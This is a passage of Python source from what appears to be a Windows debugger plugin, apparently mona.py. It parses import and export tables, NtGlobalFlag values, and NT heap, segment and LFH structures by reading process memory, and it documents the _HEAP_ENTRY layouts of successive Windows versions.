													thisfuncfullname = tparts[0] + ("!%08x" % iatptr)
												else:
													thisfuncfullname = tparts[0] + ("!%016x" % iatptr)
											else:
												if arch == 32:
													thisfuncfullname = "unknown!%08x" % iatptr
												else:
													thisfuncfullname = "unknown!%016x" % iatptr

									thisfuncname = thisfuncfullname.split('!')
									if len(thisfuncname) > 1:
										IAT[ptr] = thisfuncname[1].strip(">")
										dbgp("      Update type4 - IAT[0x%x] to %s" % (ptr, IAT[ptr]))
									else:
										dbgp("      Attempted to do thisfuncname[1], but not enough elements: %s" % thisfuncname)
										dbgp("      thisfuncfullname: %s" % thisfuncfullname)

				if len(IAT) == 0:
					dbgp("      No IAT found for module %s" % self.moduleKey)
					dbgp("      Adding fake IAT entry in cache, to avoid trying again")
					# if we get here, it means we couldn't find anything
					# avoid doing all of this again
					# so we'll add an empty entry in the cache
					# for this module
					IAT[0] = "no_iat_found"

				self.IAT = IAT
				mnproc.IATCache[self.moduleKey] = IAT
			else:
				dbg.log("      Retrieving IAT from cache")             
				IAT = mnproc.IATCache[self.moduleKey] #IAT = self.IAT
		except:
			import traceback
			dbg.logLines(traceback.format_exc())
			return IAT
		return IAT
		
	
	def getEAT(self):
		dbgp(get_current_function_name())
		eatlist = {}
		if len(self.EAT) == 0:
			try:
				# avoid major suckage, let's do it ourselves
				# find optional header
				PEHeader_ref = self.moduleBase + 0x3c
				PEHeader_location = self.moduleBase + struct.unpack('<L', dbg.readMemory(PEHeader_ref, 4))[0]

				# do we have an optional header ?
				bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location + 0x14, 2)
				sizeOfOptionalHeader = struct.unpack('<L', bsizeOfOptionalHeader + b"\x00\x00")[0]
				OptionalHeader_location = PEHeader_location + 0x18

				if sizeOfOptionalHeader > 0:

					# PE32 vs PE32+
					optional_magic = struct.unpack('<H', dbg.readMemory(OptionalHeader_location, 2))[0]

					if optional_magic == 0x10b:
						# PE32
						DataDirectory_location = OptionalHeader_location + 0x60
					elif optional_magic == 0x20b:
						# PE32+
						DataDirectory_location = OptionalHeader_location + 0x70
					else:
						DataDirectory_location = 0

					if DataDirectory_location > 0:
						# Export Directory = DataDirectory[0]
						exporttable_rva = struct.unpack('<L', dbg.readMemory(DataDirectory_location + 0x00, 4))[0]
						exporttable_size = struct.unpack('<L', dbg.readMemory(DataDirectory_location + 0x04, 4))[0]

						if exporttable_rva > 0 and exporttable_size > 0:
							eatAddr = self.moduleBase + exporttable_rva

							# IMAGE_EXPORT_DIRECTORY
							# 0x14 NumberOfFunctions
							# 0x18 NumberOfNames
							# 0x1c AddressOfFunctions
							# 0x20 AddressOfNames
							# 0x24 AddressOfNameOrdinals
							nr_of_functions = struct.unpack('<L', dbg.readMemory(eatAddr + 0x14, 4))[0]
							nr_of_names = struct.unpack('<L', dbg.readMemory(eatAddr + 0x18, 4))[0]
							address_of_functions = self.moduleBase + struct.unpack('<L', dbg.readMemory(eatAddr + 0x1c, 4))[0]
							rva_of_names = self.moduleBase + struct.unpack('<L', dbg.readMemory(eatAddr + 0x20, 4))[0]
							address_of_name_ordinals = self.moduleBase + struct.unpack('<L', dbg.readMemory(eatAddr + 0x24, 4))[0]

							dbgp("Export table at 0x%x, size 0x%x" % (eatAddr, exporttable_size))
							dbgp("NumberOfFunctions: %d" % nr_of_functions)
							dbgp("NumberOfNames: %d" % nr_of_names)
							dbgp("AddressOfFunctions: 0x%x" % address_of_functions)
							dbgp("AddressOfNames: 0x%x" % rva_of_names)
							dbgp("AddressOfNameOrdinals: 0x%x" % address_of_name_ordinals)

							for i in range(0, nr_of_names):
								name_rva = struct.unpack('<L', dbg.readMemory(rva_of_names + (4 * i), 4))[0]
								eatName = dbg.readString(self.moduleBase + name_rva)
								eatName = ensure_text(eatName)

								ordinal_index = struct.unpack('<H', dbg.readMemory(address_of_name_ordinals + (2 * i), 2))[0]

								if ordinal_index < nr_of_functions:
									func_rva = struct.unpack('<L', dbg.readMemory(address_of_functions + (4 * ordinal_index), 4))[0]
									eatAddress = self.moduleBase + func_rva
									eatlist[eatAddress] = eatName

									#if DEBUG_MODE:
									#	dbgp("EAT[0x%x] = %s (ordinal index %d)" % (eatAddress, eatName, ordinal_index))
							dbgp("EAT List has %d elements so far" % len(eatlist))

				self.EAT = eatlist
			except Exception as e:
				dbgp("Error getting EAT for module %s: %s" % (self.internalname, str(e)), errormode=False)
				dbgp("%s" % traceback.format_exc(), errormode=False)
				dbgp("eatlist: %s" % eatlist, errormode=False)
				return eatlist
		else:
			eatlist = self.EAT
		return eatlist

	
	def getShortName(self):
		return stripExtension(self.moduleKey)

def getNtGlobalFlag():
	_ensureMnProc(entities=["peb"])
	flagoffset = 0x68
	if arch == 64:
		flagoffset = 0xBC
	pebaddress = MnPEB.get_address()
	if mnproc.NtGlobalFlag == -1:
		try:
			mnproc.NtGlobalFlag = struct.unpack('<L',dbg.readMemory(pebaddress+flagoffset,4))[0]
		except:
			mnproc.NtGlobalFlag = 0
	return mnproc.NtGlobalFlag

def getNtGlobalFlagDefinitions():
	definitions = {}
	
	definitions[0x0]		= ["","No GFlags enabled"]
	
	definitions[0x00000001]	= ["soe", "Stop On Execute"]
	definitions[0x00000002]	= ["sls", "Show Loader Snaps"]
	definitions[0x00000004]	= ["dic", "Debug Initial Command"]
	definitions[0x00000008]	= ["shg", "Stop On Hung GUI"]
	
	definitions[0x00000010]	= ["htc", "Enable Heap Tail Checking"]
	definitions[0x00000020]	= ["hfc", "Enable Heap Free Checking"]
	definitions[0x00000040]	= ["hpc", "Enable Heap Parameter Checking"]
	definitions[0x00000080]	= ["hvc", "Enable Heap Validation On Call"]
	
	definitions[0x00000100]	= ["vrf", "Enable Application Verifier"]
	definitions[0x00000200]	= ["   ", "Enable Silent Process Exit Monitoring"]
	if not win7mode:
		definitions[0x00000400]	= ["ptg", "Enable Pool Tagging"]
	definitions[0x00000800]	= ["htg", "Enable Heap Tagging"]
	
	definitions[0x00001000]	= ["ust", "Create User Mode Stack Trace"]
	definitions[0x00002000]	= ["kst", "Create Kernel Mode Stack Trace"]
	definitions[0x00004000]	= ["otl", "Maintain A List Of Objects For Each Type"]
	definitions[0x00008000]	= ["htd", "Enable Heap Tagging By DLL"]
	
	definitions[0x00010000]	= ["dse", "Disable Stack Extension"]
	definitions[0x00020000]	= ["d32", "Enable Debugging Of Win32 Subsystem"]
	definitions[0x00040000]	= ["ksl", "Enable Loading Of Kernel Debugger Symbols"]
	definitions[0x00080000]	= ["dps", "Disable Paging Of Kernel Stacks"]
	
	definitions[0x00100000]	= ["scb", "Enable System Critical Breaks"]
	definitions[0x00200000]	= ["dhc", "Disable Heap Coalesce On Free"]
	definitions[0x00400000]	= ["ece", "Enable Close Exception"]
	definitions[0x00800000]	= ["eel", "Enable Exception Logging"]
	
	definitions[0x01000000]	= ["eot", "Early Object Handle Type Tagging"]
	definitions[0x02000000]	= ["hpa", "Enable Page Heap"]
	definitions[0x04000000]	= ["dwl", "Debug WinLogon"]
	definitions[0x08000000]	= ["ddp", "Buffer DbgPrint Output"]

	definitions[0x10000000] = ["cse", "Early Critical Section Event Creation"]
	definitions[0x40000000] = ["bhd", "Disable Bad Handles Detection"]
	definitions[0x80000000]	= ["dpd", "Disable Protected DLL Verification"]
	
	return definitions

def getNtGlobalFlagValues(flag):
	allvalues = []
	for defvalue in getNtGlobalFlagDefinitions():
		if defvalue > 0:
			allvalues.append(defvalue)
	# sort list descending
	allvalues.sort(reverse=True)
	flagvalues = []
	remaining = flag
	for flagvalue in allvalues:
		if flagvalue <= remaining:
			remaining -= flagvalue
			if remaining >= 0:
				flagvalues.append(flagvalue)
	return flagvalues

def getNtGlobalFlagNames(flag):
	names = []
	allvalues = getNtGlobalFlagDefinitions()
	currentvalues = getNtGlobalFlagValues(flag)
	for defvalue in currentvalues:
		if defvalue > 0:
			names.append(allvalues[defvalue][0])
	return names

def getNtGlobalFlagValueData(flagvalue):
	toreturn = ["",""]
	if flagvalue in getNtGlobalFlagDefinitions():
		toreturn = getNtGlobalFlagDefinitions()[flagvalue]
	return toreturn

def getActiveFlagNames(flagvalue):
	currentflags = getNtGlobalFlagValues(flagvalue)
	flagdefs = getNtGlobalFlagDefinitions()
	flagnames = []
	if len(currentflags) == 0:
		currentflags = [0]
	for flag in currentflags:
		if flag in flagdefs:
			flagdata = flagdefs[flag]
			flagnames.append(flagdata[0])
	return ",".join(flagnames)

def getNtGlobalFlagValueName(flagvalue):
	data = getNtGlobalFlagValueData(flagvalue)
	toreturn = ""
	if data[0] != "":
		toreturn += "+" + data[0]
	else:
		toreturn += "    "
	toreturn += " - "
	toreturn += data[1]
	return toreturn

def getProcessHeapsInfo():
	"""
	Enumerates all process heaps by walking PEB->ProcessHeaps via
	direct memory reads. Uses MnHeap for type detection and encoding.

	Return:
		Dict keyed by heap type ("NT", "Segment", "Unknown").
		Each value is a dict keyed by heap base address, containing:
		  NT entries:
		    - "index"           : int, heap index in PEB.ProcessHeaps
		    - "encode_enabled"  : bool, True if EncodeFlagMask != 0
		    - "encode_flag_mask": int, EncodeFlagMask value
		    - "encoding_raw"    : bytes or None, raw Encoding bytes
		  Segment entries:
		    - "index"           : int, heap index in PEB.ProcessHeaps
		  Unknown entries:
		    - "index"           : int, heap index in PEB.ProcessHeaps
		    - "nt_signature"    : int or None, _HEAP.Signature value read
		    - "seg_signature"   : int or None, _SEGMENT_HEAP.Signature value read
	"""
	results = {"NT": {}, "Segment": {}, "Unknown": {}}

	# Read PEB address
	try:
		peb = MnPEB.get_address()
	except:
		return results

	# PEB.NumberOfHeaps (ULONG) and PEB.ProcessHeaps (PVOID*)
	nrofheaps_off = archValue(0x88, 0xe8)
	processheaps_off = archValue(0x90, 0xf0)
	ptrsize = archValue(4, 8)

	try:
		nrofheaps = struct.unpack('<L', dbg.readMemory(peb + nrofheaps_off, 4))[0]
		processheaps_ptr = readPtrSizeBytes(peb + processheaps_off)
	except:
		return results

	seen_heap_addrs = set()

	for idx in range(nrofheaps):
		try:
			heapaddr = readPtrSizeBytes(processheaps_ptr + (idx * ptrsize))
		except:
			continue
		if heapaddr == 0:
			break
		if heapaddr in seen_heap_addrs:
			continue
		seen_heap_addrs.add(heapaddr)

		mheap = MnHeap(heapaddr)
		htype = mheap.getHeapType()

		if htype == "NT":
			encinfo = mheap.getEncodingInfo()
			encinfo["index"] = idx
			results["NT"][heapaddr] = encinfo
		elif htype == "Segment":
			results["Segment"][heapaddr] = {"index": idx}
		else:
			nt_sig = None
			seg_sig = None
			try:
				nt_sig = mheap.getSignature()
			except:
				pass
			try:
				seg_sig = mheap.getSegmentHeapSignature()
			except:
				pass
			results["Unknown"][heapaddr] = {"index": idx, "nt_signature": nt_sig, "seg_signature": seg_sig}

	return results

def getNTSegmentInfo(heapbase, segaddr, segstart, segend, firstentry, lastentry):
	"""
	Enumerates all chunks in a heap segment using MnSegment, grouping
	them by heap flag state with size information for statistics.

	Arguments:
		heapbase   - int, base address of the owning _HEAP
		segaddr    - int, address of the _HEAP_SEGMENT structure
		segstart   - int, segment BaseAddress
		segend     - int, end of segment (base + pages * 0x1000)
		firstentry - int, FirstEntry pointer
		lastentry  - int, LastValidEntry pointer

	Return:
		Dict with keys:
		  - "base"       : int, segment BaseAddress
		  - "end"        : int, end of committed region
		  - "pages"      : int, (end - base) / 0x1000
		  - "firstentry" : int, FirstEntry pointer
		  - "lastentry"  : int, LastValidEntry pointer
		  - "chunks"     : dict keyed by flag state string, e.g.:
		      "Busy"     : [{"address": int, "size": int, "flag": int}, ...]
		      "Free"     : [{"address": int, "size": int, "flag": int}, ...]
		      "Last"     : [...]
		      etc. (keys match getHeapFlag() output)
		  - "total_chunks" : int, total number of chunks enumerated
	"""
	mseg = MnSegment(heapbase, segstart, segend, firstentry, lastentry)
	try:
		allchunks = mseg.getChunks()
	except:
		allchunks = {}

	# Group chunks by flag state
	chunks_by_state = {}
	busy = 0
	free_count = 0
	max_free = 0
	for chunkaddr, chunk in allchunks.items():
		state = "BUSY" if (chunk.flag & 0x01) else "FREE"
		csize = chunk.size * heapgranularity
		chunkinfo = {
			"address": chunkaddr,
			"size": csize,
			"flag": chunk.flag,
			"userptr": chunk.userptr,
			"usersize": chunk.usersize,
		}
		if chunk.flag & 0x01:
			busy += 1
		else:
			free_count += 1
			if csize > max_free:
				max_free = csize
		if state not in chunks_by_state:
			chunks_by_state[state] = []
		chunks_by_state[state].append(chunkinfo)

	return {
		"base": segstart,
		"end": segend,
		"pages": (segend - segstart) // 0x1000,
		"firstentry": firstentry,
		"lastentry": lastentry,
		"chunks": chunks_by_state,
		"total_chunks": len(allchunks),
		"busy_chunks": busy,
		"free_chunks": free_count,
		"max_free": max_free,
	}

def getNTHeapInfo(heapaddr):
	"""
	Enumerates Segments and VirtualAllocd Blocks for a single NT heap
	using direct memory reads.

	Arguments:
		heapaddr - int, base address of an NT heap

	Return:
		Dict with keys:
		  - "segments"  : dict keyed by segment address, each value is a dict:
		      - "base"       : int, BaseAddress
		      - "end"        : int, base + pages * 0x1000
		      - "pages"      : int, NumberOfPages
		      - "firstentry" : int, FirstEntry
		      - "lastentry"  : int, LastValidEntry
		      - "chunks"     : dict keyed by flag state (from getNTSegmentInfo)
		      - "total_chunks": int
		  - "va_blocks" : dict keyed by VA block address, each value is a dict:
		      - "commit_size"  : int
		      - "reserve_size" : int
	"""
	mheap = MnHeap(heapaddr)
	result = {"segments": {}, "va_blocks": {}}

	# --- Segments ---
	try:
		seglist = mheap.getHeapSegmentList()
		for segaddr, seg in seglist.items():
			result["segments"][segaddr] = getNTSegmentInfo(
				heapaddr, segaddr,
				seg["base"], seg["end"],
				seg["firstentry"], seg["lastentry"]
			)
	except:
		pass

	# --- VirtualAllocd Blocks ---
	try:
		vablocks = mheap.getVirtualAllocdBlocks()
		for vaaddr, vainfo in vablocks.items():
			result["va_blocks"][vaaddr] = vainfo
	except:
		pass

	# --- LFH subsegment ranges (for LFH chunk detection in procLayout) ---
	try:
		result["lfh_ranges"] = getLFHSubSegmentRanges(heapaddr)
	except:
		result["lfh_ranges"] = []

	return result

def _lfh_contains(addr, lfh_ranges, lfh_starts):
	"""Return True if addr falls within any cached LFH subsegment range."""
	if not lfh_starts:
		return False
	idx = bisect.bisect_right(lfh_starts, addr) - 1
	if idx >= 0:
		return addr < lfh_ranges[idx][1]
	return False

def getLFHSubSegmentRanges(heapaddr):
	"""
	Walk the LFH SegmentInfoArrays (Win8+) or embedded SegmentInfo (Vista/7)
	and return a sorted list of (start, end) address tuples covering each
	active/cached _HEAP_SUBSEGMENT's UserBlocks memory region.

	These ranges are used in procLayout to tag chunks that are managed
	by the LFH rather than the segment allocator.

	Return: sorted list of (start, end) int tuples; [] if LFH is not
	        active or the walk fails.
	"""
	ptrsize = archValue(4, 8)
	ai = 1 if arch == 64 else 0
	ranges = []

	try:
		mheap = MnHeap(heapaddr)
		if not mheap.usesLFH():
			return []
		lfh_addr = mheap.getLFHAddress()
		if lfh_addr == 0:
			return []

		# Select LFH descriptor class and subsegment field offsets.
		# isinstance order: most-derived first (MnNT11Heap < MnNT10Heap < MnNT8Heap < MnNTVistaHeap).
		if isinstance(mheap, (MnNT10Heap, MnNT11Heap)):
			lfh_cls = MnNT10LFH
			ss_blocksize_off  = (0x014, 0x024)
			ss_blockcount_off = (0x018, 0x028)
			use_ptr_array = True
			n_buckets = 129
		elif isinstance(mheap, MnNT8Heap):
			lfh_cls = MnNT8LFH
			ss_blocksize_off  = (0x014, 0x024)
			ss_blockcount_off = (0x018, 0x028)
			use_ptr_array = True
			n_buckets = 129
		else:
			# Vista / 7
			lfh_cls = MnNTVistaLFH
			ss_blocksize_off  = (0x010, 0x018)
			ss_blockcount_off = (0x014, 0x01c)
			use_ptr_array = False
			n_buckets = 128

		ss_userblocks_off = (0x004, 0x008)  # same for all versions

		seen_ss = set()

		def _add_subsegment(ssptr):
			if ssptr == 0 or ssptr in seen_ss:
				return
			seen_ss.add(ssptr)
			try:
				ub = readPtrSizeBytes(ssptr + ss_userblocks_off[ai])
				if ub == 0:
					return
				bs = struct.unpack('<H', dbg.readMemory(ssptr + ss_blocksize_off[ai], 2))[0]
				bc = struct.unpack('<H', dbg.readMemory(ssptr + ss_blockcount_off[ai], 2))[0]
				if bs == 0 or bc == 0:
					return
				total = bs * bc * heapgranularity
				ranges.append((ub, ub + total))
			except:
				pass

		# Offsets within _HEAP_LOCAL_SEGMENT_INFO (same for all versions)
		lsi_active_off = (0x004, 0x008)
		lsi_cached_off = (0x008, 0x010)

		if use_ptr_array:
			# Win8+: SegmentInfoArrays is an array of n_buckets pointers at LFH base
			sia_base = lfh_addr + lfh_cls._offsets["SegmentInfoArrays"][ai]
			for i in range(n_buckets):
				try:
					lsi_ptr = readPtrSizeBytes(sia_base + i * ptrsize)
				except:
					continue
				if lsi_ptr == 0:
					continue
				try:
					active = readPtrSizeBytes(lsi_ptr + lsi_active_off[ai])
					_add_subsegment(active)
					cached_base = lsi_ptr + lsi_cached_off[ai]
					for j in range(16):
						item = readPtrSizeBytes(cached_base + j * ptrsize)
						_add_subsegment(item)
				except:
					pass
		else:
			# Vista/7: SegmentInfo[128] is embedded (not pointers) in _HEAP_LOCAL_DATA
			local_data_addr = lfh_addr + lfh_cls._offsets["LocalData"][ai]
			seg_info_base_off = (0x018, 0x030)  # offset within _HEAP_LOCAL_DATA
			seg_info_stride   = (0x064, 0x0b8)  # sizeof(_HEAP_LOCAL_SEGMENT_INFO)
			seg_info_base = local_data_addr + seg_info_base_off[ai]
			stride = seg_info_stride[ai]
			for i in range(n_buckets):
				lsi_addr = seg_info_base + i * stride
				try:
					active = readPtrSizeBytes(lsi_addr + lsi_active_off[ai])
					_add_subsegment(active)
					cached_base = lsi_addr + lsi_cached_off[ai]
					for j in range(16):
						item = readPtrSizeBytes(cached_base + j * ptrsize)
						_add_subsegment(item)
				except:
					pass
	except:
		pass

	ranges.sort()
	return ranges

#---------------------------------------#
#  Class for heap structures            #
#---------------------------------------#

"""
_HEAP_ENTRY compact-header descriptor classes.

Each class documents the byte layout of the 8-byte compact _HEAP_ENTRY
header for a specific Windows version, and provides a parse() classmethod
that extracts fields from a raw 8-byte buffer.

On x86 the chunk pointer points directly to the compact header.
On x64 (all versions including XP) the chunk pointer points to a 16-byte
_HEAP_ENTRY: bytes 0-7 are PreviousBlockPrivateData (plain-text, unencoded),
bytes 8-15 are the compact header (XOR-encoded on Vista+).  _DATA_OFFSET
records this as (x86_offset, x64_offset) so callers can read the right bytes.

Confirmed from PDB dumps in logs/:
  XP x64   (logs/xp/64):   prefix @0, compact @8, layout == XP x86
  Vista x64 (logs/vista/64): prefix @0, compact @8, layout == Vista x86
  Win7 x64  (logs/7/64):   prefix @0, compact @8, layout == Vista x64 (confirmed native)
  Win8 x64  (logs/8/64):   prefix @0, compact @8, layout == Vista x64
  Win8.1 x64 (logs/8.1/64): prefix @0, compact @8, layout == Win8 x64
  Win10 x64 (logs/10/64):  prefix @0, compact @8, layout == Vista x64

Heap classes expose the appropriate descriptor via _chunk_entry_class.

All offset tuples follow the (x86_value, x64_value) convention used throughout
the codebase.  The compact header layout is arch-independent (field positions
are the same on x86 and x64); the arch difference is only the pointer-width
prefix captured by _DATA_OFFSET.  Tuples therefore always have equal elements,
but the consistent form lets callers use cls._arch_index uniformly.
"""

class MnNTXPChunkEntry:
	"""
	_HEAP_ENTRY compact header layout for Windows XP / 2003.

	No XOR encoding on XP; the compact header is read plain from memory.

	_HEAP_ENTRY (x86, 8 bytes total)
	+0x000 Size             : Uint2B
	+0x002 PreviousSize     : Uint2B
	+0x000 SubSegmentCode   : Ptr32 Void  (union)
	+0x004 SmallTagIndex    : UChar
	+0x005 Flags            : UChar
	+0x006 UnusedBytes      : UChar
	+0x007 SegmentIndex     : UChar       (removed in Vista)

	_HEAP_ENTRY (x64, 16 bytes total)
	+0x000 PreviousBlockPrivateData : Ptr64 Void  (plain-text prefix, not in compact header)
	+0x008 Size             : Uint2B       (compact header starts here)
	+0x00a PreviousSize     : Uint2B
	+0x00c SmallTagIndex    : UChar
	+0x00d Flags            : UChar
	+0x00e UnusedBytes      : UChar
	+0x00f SegmentIndex     : UChar
	+0x008 CompactHeader    : Uint8B  (union over above 8 bytes)
	"""

	_arch_index = 1 if arch == 64 else 0
	_HEADER_SIZE = 8  # compact header is always 8 bytes
	# Byte offset from chunk pointer to the compact header start.
	# x86: no prefix (0).  x64: PreviousBlockPrivateData prefix (8 bytes).
	_DATA_OFFSET = (0, 8)  # (x86, x64)

	# Field offsets within the decoded 8-byte compact header: (x86, x64).
	# The compact header layout is arch-independent; tuples are equal pairs.
	_offsets = {
		"Size":          (0x000, 0x000),  # Uint2B
		"PreviousSize":  (0x002, 0x002),  # Uint2B
		"SmallTagIndex": (0x004, 0x004),  # UChar  (passed as 'segment' / SegmentId in MnChunk)
		"Flags":         (0x005, 0x005),  # UChar
		"UnusedBytes":   (0x006, 0x006),  # UChar
		"SegmentIndex":  (0x007, 0x007),  # UChar  (XP only — index into Segments[64] array)
	}

	@classmethod
	def data_offset(cls):
		"""Return the byte offset from the chunk pointer to the compact header."""
		return cls._DATA_OFFSET[cls._arch_index]

	@classmethod
	def parse(cls, raw_bytes):
		"""Parse an 8-byte compact header buffer.  Returns a field dict."""
		ai = cls._arch_index
		o = cls._offsets
		return {
			"Size":          struct.unpack('<H', raw_bytes[o["Size"][ai]:o["Size"][ai]+2])[0],
			"PreviousSize":  struct.unpack('<H', raw_bytes[o["PreviousSize"][ai]:o["PreviousSize"][ai]+2])[0],
			"SmallTagIndex": struct.unpack('<B', raw_bytes[o["SmallTagIndex"][ai]:o["SmallTagIndex"][ai]+1])[0],
			"Flags":         struct.unpack('<B', raw_bytes[o["Flags"][ai]:o["Flags"][ai]+1])[0],
			"UnusedBytes":   struct.unpack('<B', raw_bytes[o["UnusedBytes"][ai]:o["UnusedBytes"][ai]+1])[0],
			"SegmentIndex":  struct.unpack('<B', raw_bytes[o["SegmentIndex"][ai]:o["SegmentIndex"][ai]+1])[0],
		}


class MnNTVistaChunkEntry:
	"""
	_HEAP_ENTRY compact header layout for Windows Vista / 7.

	Vista introduced XOR encoding of the compact header (EncodeFlagMask / Encoding).
	Win7 is byte-identical to Vista on both arches (confirmed from logs/7/32 and logs/7/64).

	Key differences from XP:
	  - Flags  moved from +0x005 (XP x86) / +0x00d (XP x64) → +0x002 / +0x00a
	  - PreviousSize moved from +0x002 / +0x00a → +0x004 / +0x00c
	  - SmallTagIndex moved from +0x004 / +0x00c → +0x003 / +0x00b
	  - UnusedBytes moved from +0x006 / +0x00e → +0x007 / +0x00f
	  - SegmentIndex (+0x007 XP) replaced by SegmentOffset (+0x006 / +0x00e)

	_HEAP_ENTRY (x86, 8 bytes total)
	+0x000 Size             : Uint2B
	+0x002 Flags            : UChar
	+0x003 SmallTagIndex    : UChar
	+0x000 SubSegmentCode   : Ptr32 Void  (union)
	+0x004 PreviousSize     : Uint2B
	+0x006 SegmentOffset    : UChar       (overlaps LFHFlags)
	+0x006 LFHFlags         : UChar
	+0x007 UnusedBytes      : UChar
	+0x000 AgregateCode     : Uint8B  (union)

	_HEAP_ENTRY (x64, 16 bytes total)
	+0x000 PreviousBlockPrivateData : Ptr64 Void  (plain-text prefix)
	+0x008 Size             : Uint2B       (compact header starts here)
	+0x00a Flags            : UChar
	+0x00b SmallTagIndex    : UChar
	+0x00c PreviousSize     : Uint2B
	+0x00e SegmentOffset    : UChar
	+0x00e LFHFlags         : UChar
	+0x00f UnusedBytes      : UChar
	+0x008 CompactHeader    : Uint8B  (union)
	"""

	_arch_index = 1 if arch == 64 else 0
	_HEADER_SIZE = 8
	_DATA_OFFSET = (0, 8)  # (x86, x64)

	# Field offsets within the decoded 8-byte compact header: (x86, x64).
	_offsets = {
		"Size":          (0x000, 0x000),  # Uint2B
		"Flags":         (0x002, 0x002),  # UChar  (was +0x005 on XP x86 / +0x00d on XP x64)
		"SmallTagIndex": (0x003, 0x003),  # UChar  (was +0x004 / +0x00c)
		"PreviousSize":  (0x004, 0x004),  # Uint2B (was +0x002 / +0x00a)
		"SegmentOffset": (0x006, 0x006),  # UChar  (replaces XP's SegmentIndex; overlaps LFHFlags)
		"UnusedBytes":   (0x007, 0x007),  # UChar  (was +0x006 / +0x00e)
	}

	@classmethod
	def data_offset(cls):
		return cls._DATA_OFFSET[cls._arch_index]

	@classmethod
	def parse(cls, raw_bytes):
		ai = cls._arch_index
		o = cls._offsets
		return {
			"Size":          struct.unpack('<H', raw_bytes[o["Size"][ai]:o["Size"][ai]+2])[0],
			"Flags":         struct.unpack('<B', raw_bytes[o["Flags"][ai]:o["Flags"][ai]+1])[0],
			"SmallTagIndex": struct.unpack('<B', raw_bytes[o["SmallTagIndex"][ai]:o["SmallTagIndex"][ai]+1])[0],
			"PreviousSize":  struct.unpack('<H', raw_bytes[o["PreviousSize"][ai]:o["PreviousSize"][ai]+2])[0],
			"SegmentOffset": struct.unpack('<B', raw_bytes[o["SegmentOffset"][ai]:o["SegmentOffset"][ai]+1])[0],
			"UnusedBytes":   struct.unpack('<B', raw_bytes[o["UnusedBytes"][ai]:o["UnusedBytes"][ai]+1])[0],
		}


class MnNT8ChunkEntry(MnNTVistaChunkEntry):
	"""
	_HEAP_ENTRY compact header layout for Windows 8 / 8.1 / 10 / 11.

	x86: Identical to Vista/7 — Code234 (Win8) and SubSegmentCode (Win8.1) are union
	     aliases overlapping +0x000–0x003; Win10 ExtendedEntry/UnpackedEntry are outer
	     union wrappers. Byte positions of Size, Flags, SmallTagIndex, PreviousSize,
	     SegmentOffset, UnusedBytes are unchanged across all these versions.

	x64: Identical to Vista/7 x64 in byte layout. SubSegmentCode (Win8.1) overlaps
	     +0x008–0x00b; Win10 union wrappers do not shift any field offsets.

	Inherits _offsets, parse(), and data_offset() unchanged from MnNTVistaChunkEntry.
	"""


class HeapType(object):
	"""High-level heap implementation type."""
	NT      = "NT"
	SEGMENT = "Segment"
	UNKNOWN = "Unknown"


class HeapVersion(object):
	"""Windows version that introduced the _HEAP layout in use."""
	XP      = "XP"
	VISTA   = "Vista"
	WIN8    = "Win8"
	WIN10   = "Win10"
	WIN11   = "Win11"
	UNKNOWN = "Unknown"


class MnHeap(object):
	"""
	Base class for heap structures. Use MnHeap(address) to create the
	appropriate subclass (MnNTHeap or MnSegmentHeap) automatically.
	"""
	heapbase = 0
	EncodeFlagMask = 0
	Encoding = 0
	
	def __new__(cls, address):
		if cls is MnHeap:
			htype = MnHeap._detectHeapType(address)
			if htype == "NT":
				return MnNTHeap.__new__(MnNTHeap, address)
			elif htype == "Segment":
				return object.__new__(MnSegmentHeap)
		return object.__new__(cls)

	@staticmethod
	def _detectHeapType(address):
		"""Detect heap type by reading signature fields from memory.

		Arguments:
			address - int, base address of the heap

		Return: str - "NT", "Segment", or "Unknown"
		"""
		dbgp("_detectHeapType(0x%x)" % address)
		try:
			sig_offset = getOsOffset("Signature")
		except Exception as e:
			dbgp("_detectHeapType: getOsOffset('Signature') failed: %s" % str(e), errormode=False)
			sig_offset = archValue(0x008, 0x008)
		dbgp("_detectHeapType: sig_offset=0x%x" % sig_offset)
		try:
			sig_val = struct.unpack('<L', dbg.readMemory(address + sig_offset, 4))[0]
			dbgp("_detectHeapType: NT sig at 0x%x = 0x%08x" % (address + sig_offset, sig_val))
			if sig_val == 0xeeffeeff:
				return "NT"
		except Exception as e:
			dbgp("_detectHeapType: NT sig read failed: %s" % str(e), errormode=False)
		try:
			seg_val = struct.unpack('<L', dbg.readMemory(address + 0x010, 4))[0]
			dbgp("_detectHeapType: Segment sig at 0x%x = 0x%08x" % (address + 0x010, seg_val))
			if seg_val == 0xddeeddee:
				return "Segment"
		except Exception as e:
			dbgp("_detectHeapType: Segment sig read failed: %s" % str(e), errormode=False)
		dbgp("_detectHeapType: returning Unknown")
		return "Unknown"

	def __init__(self, address):
		dbgp(get_current_function_name())

		self.heapbase = address
		self.VirtualAllocdBlocks = {}
		self.LookAsideList = {}
		self.SegmentList = {}
		self.lalheads = {}
		self.Encoding = 0
		self.EncodeFlagMask = 0
		self.FrontEndHeap = 0
		self._corrupted = None
		self.heap_type    = HeapType.UNKNOWN
		self.heap_version = HeapVersion.UNKNOWN
		return None

	def isCorrupted(self):
		"""Check if the heap signature is valid.

		Return: bool - True if the heap signature does not match
		the expected NT (0xeeffeeff) or Segment (0xddeeddee) value.
		"""
		if self._corrupted is not None:
			return self._corrupted
		htype = self.getHeapType()
		try:
			if htype == "NT":
				self._corrupted = self.getSignature() != 0xeeffeeff
			elif htype == "Segment":
				self._corrupted = self.getSegmentHeapSignature() != 0xddeeddee
			else:
				# Unknown type means neither signature matched
				self._corrupted = True
		except:
			self._corrupted = True
		return self._corrupted

	def getSignature(self):
		"""
		Read the _HEAP.Signature (DWORD) from the heap base.

		Return: int (e.g. 0xeeffeeff for NT heap)
		"""
		sig_offset = getOsOffset("Signature")
		return struct.unpack('<L', dbg.readMemory(self.heapbase + sig_offset, 4))[0]

	def getSegmentHeapSignature(self):
		"""
		Read the _SEGMENT_HEAP.Signature (DWORD) at offset +0x010.

		Return: int (e.g. 0xddeeddee for Segment heap)
		"""
		return struct.unpack('<L', dbg.readMemory(self.heapbase + 0x010, 4))[0]

	def getHeapType(self):
		"""
		Returns the heap type string.
		Subclasses override to return "NT" or "Segment".

		Return: str - "NT", "Segment", or "Unknown"
		"""
		return "Unknown"

	def getHeapVersion(self):
		"""Return the HeapVersion enum member for this heap instance.

		Return: HeapVersion
		"""
		return self.heap_version

	def getHeaderSize(self):
		"""Return the size of the _HEAP structure header in bytes.

		Uses ntdll symbols via getTypeSize when available (WinDBG only).
		Returns 0 if symbols are not available or on Immunity Debugger.
		"""
